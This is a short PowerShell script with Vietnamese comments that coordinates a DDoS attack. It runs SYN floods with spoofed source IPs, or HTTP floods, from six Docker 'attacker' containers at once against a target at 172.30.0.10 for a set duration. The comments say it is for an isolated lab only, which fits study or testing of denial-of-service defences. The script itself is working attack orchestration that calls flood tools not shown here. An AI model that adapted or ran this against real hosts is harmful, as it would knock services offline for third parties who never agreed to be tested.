# Orchestrator DDoS - chi dung trong lab co lap
# Cach dung:
#   .\run_ddos.ps1 syn      -> ca 6 attacker SYN flood dong loat
#   .\run_ddos.ps1 http     -> ca 6 attacker HTTP flood dong loat
param(
    [ValidateSet("syn","http")]
    [string]$mode = "syn",
    [string]$target = "172.30.0.10",
    [int]$duration = 30
)

$attackers = @("attacker1","attacker2","attacker3","attacker4","attacker5","attacker6")
Write-Host "[*] Bat dau DDoS mode=$mode tu $($attackers.Count) nguon -> $target trong ${duration}s"

$jobs = foreach ($a in $attackers) {
    if ($mode -eq "syn") {
        # SYN flood: spoof IP, chay theo thoi gian (uoc ~ count lon)
        Start-Job -ScriptBlock {
            param($a,$target,$dur)
            docker exec $a timeout $dur python3 /app/syn_flood.py $target -p 80 --spoof
        } -ArgumentList $a,$target,$duration
    } else {
        Start-Job -ScriptBlock {
            param($a,$target,$dur)
            docker exec $a python3 /app/http_flood.py $target -p 80 -t 20 -d $dur
        } -ArgumentList $a,$target,$duration
    }
}

Write-Host "[*] Dang tan cong... (doi $duration giay)"
$jobs | Wait-Job | Out-Null
$jobs | Receive-Job
$jobs | Remove-Job
Write-Host "[*] DDoS ket thuc."
